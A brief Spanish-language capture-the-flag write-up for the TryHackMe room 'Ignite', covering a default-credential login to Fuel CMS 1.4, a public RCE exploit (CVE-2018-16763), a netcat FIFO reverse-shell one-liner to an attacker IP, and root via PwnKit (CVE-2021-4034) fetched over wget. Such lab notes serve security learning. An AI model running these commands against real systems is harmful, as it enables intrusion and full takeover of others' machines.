# Ignite
- THM
- 10.130.175.229
- nmap -sCV -Pn 10.130.175.229 -> Solo puerto http 80 abierto :)
- Fuel CMS -> Version 1.4 identificamos CMS.
- Fuzzeamos -> ffuf -u http://10.130.175.229/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
- /0 , /home, /index , /index.php , /offline y /robots.txt -> encuentro Disallow: /fuel/ -> http://10.130.175.229/fuel/login/5a6e566c6243396b59584e6f596d3968636d513d -> redirige a un panel de login. -> pruebo admin y admin -> entro xd...
- Veo en el panel de admin del CMS ->  My Website
Site

    Dashboard
    Pages
    Blocks
    Navigation
    Assets
    Site Variables

Manage

    Users
    Permissions
    Page Cache
    Activity Log
    Settings
- No encuentro gran cosa para poder enviarme una shell busco por cve/ exploits de esa versión -> searchspolit fuelcms 1.4 fuel CMS 1.4.1 - Remote Code Execution (1) voy a probar con este exploit.
- searchsploit -m 47138 (CVE-2018-16763)
- Adapto el script para python 3 y ejecuto
- python3 47138-python3.py ejecuto y listo estamos dentro para ejecutar comandos -> id -> solo sirve para ejecutar un comando.
- rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.173.148 4444 > /tmp/f -> reverse shell con mecanismo fifo para persistir FIFO reverse shell
- Directorio de www-data y pillamos user flag.
- python3 -c 'import pty; pty.spawn("/bin/bash")' para tener una tty ( que no tenia antes ) ->  sudo -l hay nada.
- find / -perm -4000 -type f 2>/dev/null busco por suid -> /usr/bin/pkexec  pkexec version 0.105 -> PwnKit (CVE-2021-4034)
- git clone https://github.com/berdav/CVE-2021-4034.git -> servimos servidor http para pasarlo a la victima
- wget -r -np -nH --cut-dirs=0 http://192.168.173.148:8000/
- make ->   ./cve-2021-4034  y somos root :) user root y dentro!
